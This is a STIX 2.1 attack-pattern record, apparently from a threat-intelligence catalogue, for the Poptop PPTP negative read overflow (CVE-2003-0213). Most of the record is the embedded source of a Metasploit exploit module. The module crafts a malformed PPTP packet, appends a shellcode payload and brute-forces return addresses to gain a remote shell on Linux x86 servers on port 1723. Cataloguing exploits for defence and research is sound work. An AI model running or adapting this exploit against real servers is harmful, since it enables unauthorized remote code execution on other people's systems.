{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d297043b-1dae-40e6-be35-2ce16fe63300",
    "created": "2024-08-14T16:58:22.864901Z",
    "modified": "2024-08-14T16:58:22.864905Z",
    "name": "Poptop Negative Read Overflow",
    "description": " This is an exploit for the Poptop negative read overflow.  This will work against versions prior to 1.1.3-b3 and 1.1.3-20030409, but I currently do not have a good way to detect Poptop versions.  The server will by default only allow 4 concurrent manager processes (what we run our code in), so you could have a max of 4 shells at once.  Using the current method of exploitation, our socket will be closed before we have the ability to run code, preventing the use of Findsock. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/pptp/poptop_negative_read.rb",
            "external_id": "poptop_negative_read.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-0213"
        },
        {
            "source_name": "reference",
            "url": "http://securityfocus.com/archive/1/317995"
        },
        {
            "source_name": "reference",
            "url": "http://www.freewebs.com/blightninjas/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Brute\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Poptop Negative Read Overflow',\n      'Description'    => %q{\n          This is an exploit for the Poptop negative read overflow.  This will\n        work against versions prior to 1.1.3-b3 and 1.1.3-20030409, but I\n        currently do not have a good way to detect Poptop versions.\n\n        The server will by default only allow 4 concurrent manager processes\n        (what we run our code in), so you could have a max of 4 shells at once.\n\n        Using the current method of exploitation, our socket will be closed\n        before we have the ability to run code, preventing the use of Findsock.\n      },\n      'Author'         => 'spoonm',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2003-0213'],\n          ['OSVDB', '3293'],\n          ['URL',   'http://securityfocus.com/archive/1/317995'],\n          ['URL',   'http://www.freewebs.com/blightninjas/'],\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          # Payload space is dynamically determined\n          'MinNops'         => 16,\n          'StackAdjustment' => -1088,\n          'Compat'          =>\n            {\n              'ConnectionType' => '-find',\n            }\n        },\n      'SaveRegisters'  => [ 'esp' ],\n      'Platform'       => 'linux',\n      'Arch'           => ARCH_X86,\n      'Targets'        =>\n        [\n          ['Linux Bruteforce',\n            { 'Bruteforce' =>\n              {\n                'Start'  => { 'Ret' => 0xbffffa00 },\n                'Stop'   => { 'Ret' => 0xbffff000 },\n                'Step'   => 0\n              }\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2003-04-09'))\n\n    register_options(\n      [\n        Opt::RPORT(1723)\n      ])\n\n    register_advanced_options(\n      [\n        OptInt.new(\"PreReturnLength\", [ true, \"Space before we hit the return address.  Affects PayloadSpace.\", 220 ]),\n        OptInt.new(\"RetLength\",       [ true, \"Length of returns after payload.\", 32 ]),\n        OptInt.new(\"ExtraSpace\",      [ true, \"The exploit builds two protocol frames, the header frame and the control frame. \" +\n          \"ExtraSpace allows you use this space for the payload instead of the protocol (breaking the protocol, but still triggering the bug). \" +\n          \"If this value is <= 128, it doesn't really disobey the protocol, it just uses the Vendor and Hostname fields for payload data \" +\n          \"(these should eventually be filled in to look like a real client, ie windows).  I've had successful exploitation with this set to 154, but nothing over 128 is suggested.\", 0 ]),\n        OptString.new(\"Hostname\",     [ false, \"PPTP Packet hostname\", '' ]),\n        OptString.new(\"Vendor\",       [ true, \"PPTP Packet vendor\", 'Microsoft Windows NT' ]),\n      ])\n  end\n\n  # Dynamic payload space calculation\n  def payload_space(explicit_target = nil)\n    datastore['PreReturnLength'].to_i + datastore['ExtraSpace'].to_i\n  end\n\n  def build_packet(length)\n    [length, 1, 0x1a2b3c4d, 1, 0].pack('nnNnn') +\n      [1,0].pack('cc') +\n      [0].pack('n') +\n      [1,1,0,2600].pack('NNnn') +\n      datastore['Hostname'].ljust(64, \"\\x00\") +\n      datastore['Vendor'].ljust(64, \"\\x00\")\n  end\n\n  def check\n    connect\n    sock.put(build_packet(156))\n    res = sock.get_once\n\n    if res and res =~ /MoretonBay/\n      return CheckCode::Detected\n    end\n\n    return CheckCode::Safe\n  end\n\n  def brute_exploit(addrs)\n    connect\n\n    print_status(\"Trying #{\"%.8x\" % addrs['Ret']}...\")\n\n    # Construct the evil length packet\n    packet =\n      build_packet(1) +\n      payload.encoded +\n      ([addrs['Ret']].pack('V') * (datastore['RetLength'] / 4))\n\n    sock.put(packet)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2003-04-09",
    "x_mitre_platforms": [
        "linux'"
    ]
}